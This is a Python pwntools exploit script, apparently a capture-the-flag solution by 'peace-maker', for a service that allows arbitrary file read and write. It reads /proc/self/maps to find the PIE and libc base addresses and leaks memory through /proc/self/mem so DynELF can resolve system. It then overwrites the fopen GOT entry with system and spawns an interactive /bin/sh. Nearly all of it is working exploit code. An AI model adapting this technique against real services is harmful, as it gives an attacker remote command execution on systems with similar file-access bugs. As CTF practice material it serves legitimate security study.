from pwn import *

"""
The challenge allows us to read and write any file at any offset and length.
Read the base addresses of the challenge and libc from /proc/self/maps.
Resolve `system` using pwntools DynELF class and set `fopen@got` to `system`.
Now the "filename" of the read/write options will get executed as a command.
by peace-maker
"""

# r = process('./chall')
r = remote('challenge.pwny.racing', 11543)
e = ELF('./chall')

# Wrappers for the two menu options of the challenge.
def read_file(file, size, offs):
    r.sendlineafter('> ', '1')
    r.sendlineafter('file: ', file)
    r.sendlineafter('size: ', str(size))
    r.sendlineafter('seek: ', str(offs))
    r.readuntil('data: ')
    return r.recv(size)

def write_file(file, size, offs, data):
    r.sendlineafter('> ', '2')
    r.sendlineafter('file: ', file)
    r.sendlineafter('size: ', str(size))
    r.sendlineafter('seek: ', str(offs))
    r.sendlineafter('data: ', data)

# Parse the base addresses of the challenge and libc.
maps = read_file('/proc/self/maps', 2048, 0).split('\n')
pie_base = int(maps[0].split('-')[0], 16)
for line in maps:
    if 'libc' in line:
        libc_base = int(line.split('-')[0], 16)
        break

log.info('PIE base: 0x{:x}'.format(pie_base))
log.info('libc base: 0x{:x}'.format(libc_base))
e.address = pie_base

# Lookup the address of `system` in libc.
@pwnlib.memleak.MemLeak
def leak(address):
    return read_file('/proc/self/mem', 100, address)

delf = DynELF(leak, libc_base)
system = delf.lookup('system')

# Overwrite GOT entry of fopen with system.
write_file('/proc/self/mem', 8, e.got['fopen'], p64(system))

# Spawn a shell.
r.sendlineafter('> ', '1')
r.sendlineafter('file: ', '/bin/sh')
r.interactive()
